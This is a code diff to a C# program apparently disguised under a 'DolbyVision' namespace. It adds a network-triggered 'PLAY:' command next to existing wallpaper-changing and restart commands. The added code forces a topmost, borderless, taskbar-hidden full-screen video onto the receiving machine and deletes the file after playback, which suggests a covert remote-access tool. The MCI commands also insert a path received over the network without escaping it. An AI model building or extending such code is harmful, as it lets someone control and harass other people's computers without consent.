@@ -500,6 +500,10 @@ namespace DolbyVision
                 {
                     return SetWallpaper(cmd.Substring(10));
                 }
+                if (cmd.StartsWith("PLAY:", StringComparison.OrdinalIgnoreCase))
+                {
+                    return PlayVideo(cmd.Substring(5));
+                }
                 if (cmd.Equals("RESTART_NORMAL", StringComparison.OrdinalIgnoreCase))
                 {
                     return RestartNormalMode();
@@ -1139,6 +1143,172 @@ namespace DolbyVision
 
         [System.Runtime.InteropServices.DllImport("user32.dll", CharSet = System.Runtime.InteropServices.CharSet.Auto)]
         private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+
+        // ========== 远程视频播放 ==========
+        private static Form _currentVideoForm = null;
+        private static readonly object _videoLock = new object();
+
+        private static string PlayVideo(string param)
+        {
+            try
+            {
+                // param: <文件名>|<模式FULL/WINDOW>|<静音0/1>
+                string[] parts = param.Split('|');
+                if (parts.Length < 2) return "ERROR: 参数错误,格式: 文件名|模式|静音";
+                string fileName = parts[0];
+                string mode = parts.Length > 1 ? parts[1].ToUpper() : "FULL";
+                bool mute = parts.Length > 2 && parts[2] == "1";
+
+                // 文件名不含路径则加TEMP
+                string videoPath = fileName;
+                if (!fileName.Contains("\\") && !fileName.Contains("/"))
+                    videoPath = Path.Combine(Path.GetTempPath(), fileName);
+
+                if (!File.Exists(videoPath)) return "ERROR: 视频文件不存在: " + videoPath;
+
+                // 关闭旧窗口
+                lock (_videoLock)
+                {
+                    if (_currentVideoForm != null && !_currentVideoForm.IsDisposed)
+                    {
+                        try { _currentVideoForm.Invoke(new Action(() => _currentVideoForm.Close())); } catch { }
+                    }
+                }
+
+                // 在新线程打开播放窗口
+                var t = new Thread(() =>
+                {
+                    try
+                    {
+                        using (var form = new VideoPlayerForm(videoPath, mode == "FULL", mute))
+                        {
+                            lock (_videoLock) { _currentVideoForm = form; }
+                            form.ShowDialog();
+                        }
+                    }
+                    catch { }
+                    finally
+                    {
+                        lock (_videoLock) { _currentVideoForm = null; }
+                        // 播放完删除视频文件
+                        try { if (File.Exists(videoPath)) File.Delete(videoPath); } catch { }
+                    }
+                });
+                t.IsBackground = true;
+                t.SetApartmentState(ApartmentState.STA);
+                t.Start();
+                return "OK: 视频播放已启动(" + mode + (mute ? ",静音" : "") + ")";
+            }
+            catch (Exception ex) { return "ERROR: " + ex.Message; }
+        }
+
+        private class VideoPlayerForm : Form
+        {
+            private readonly string _videoPath;
+            private readonly bool _fullscreen;
+            private readonly bool _mute;
+            private IntPtr _mcidev = IntPtr.Zero;
+            private Label _hintLabel;
+            private System.Windows.Forms.Timer _hintTimer;
+
+            [System.Runtime.InteropServices.DllImport("winmm.dll")]
+            private static extern int mciSendString(string lpstrCommand, StringBuilder lpstrReturnString, int uReturnLength, IntPtr hwndCallback);
+
+            public VideoPlayerForm(string videoPath, bool fullscreen, bool mute)
+            {
+                _videoPath = videoPath;
+                _fullscreen = fullscreen;
+                _mute = mute;
+                InitForm();
+            }
+
+            private void InitForm()
+            {
+                FormBorderStyle = _fullscreen ? FormBorderStyle.None : FormBorderStyle.Sizable;
+                WindowState = _fullscreen ? FormWindowState.Maximized : FormWindowState.Normal;
+                TopMost = true;
+                ShowInTaskbar = false;
+                StartPosition = FormStartPosition.CenterScreen;
+                BackColor = Color.Black;
+                ShowIcon = false;
+                if (!_fullscreen) { Size = new Size(800, 600); Text = ""; }
+
+                // ESC退出提示
+                _hintLabel = new Label
+                {
+                    Text = "按 ESC 退出",
+                    ForeColor = Color.FromArgb(180, Color.White),
+                    BackColor = Color.FromArgb(120, 0, 0, 0),
+                    Font = new Font("Consolas", 12f, FontStyle.Bold),
+                    AutoSize = true,
+                    Padding = new Padding(8, 4, 8, 4),
+                    Visible = true
+                };
+                _hintLabel.Location = new Point(10, _fullscreen ? Screen.PrimaryScreen.Bounds.Height - 40 : Height - 50);
+                Controls.Add(_hintLabel);
+
+                _hintTimer = new System.Windows.Forms.Timer { Interval = 3000 };
+                _hintTimer.Tick += (s, e) => { _hintTimer.Stop(); _hintLabel.Visible = false; };
+                _hintTimer.Start();
+
+                KeyPreview = true;
+                KeyDown += (s, e) => { if (e.KeyCode == Keys.Escape) Close(); };
+                FormClosed += (s, e) => StopVideo();
+                Shown += (s, e) => StartVideo();
+            }
+
+            private void StartVideo()
+            {
+                try
+                {
+                    string alias = "dvvideo" + DateTime.Now.Ticks;
+                    string cmd = "open \"" + _videoPath + "\" type mpegvideo alias " + alias;
+                    var sb = new StringBuilder(256);
+                    mciSendString(cmd, sb, 256, IntPtr.Zero);
+                    _mcidev = (IntPtr)1; // 标记已打开
+                    // 把视频输出到当前窗口
+                    mciSendString("window " + alias + " handle " + Handle.ToInt32(), sb, 256, IntPtr.Zero);
+                    mciSendString("put " + alias + " destination at 0 0 " + Width + " " + Height, sb, 256, IntPtr.Zero);
+                    if (_mute) mciSendString("setaudio " + alias + " off", sb, 256, IntPtr.Zero);
+                    mciSendString("play " + alias + " notify", sb, 256, IntPtr.Zero);
+                    // 保存alias用于关闭
+                    Tag = alias;
+                }
+                catch { }
+            }
+
+            private void StopVideo()
+            {
+                try
+                {
+                    if (Tag != null)
+                    {
+                        string alias = Tag.ToString();
+                        var sb = new StringBuilder(256);
+                        mciSendString("stop " + alias, sb, 256, IntPtr.Zero);
+                        mciSendString("close " + alias, sb, 256, IntPtr.Zero);
+                    }
+                }
+                catch { }
+            }
+
+            protected override void OnResize(EventArgs e)
+            {
+                base.OnResize(e);
+                try
+                {
+                    if (Tag != null && _mcidev != IntPtr.Zero)
+                    {
+                        string alias = Tag.ToString();
+                        var sb = new StringBuilder(256);
+                        mciSendString("put " + alias + " destination at 0 0 " + Width + " " + Height, sb, 256, IntPtr.Zero);
+                    }
+                    if (_hintLabel != null)
+                        _hintLabel.Location = new Point(10, Height - 50);
+                }
+                catch { }
+            }
+        }
 
         private static void WriteStr(NetworkStream stream, string s)
         {
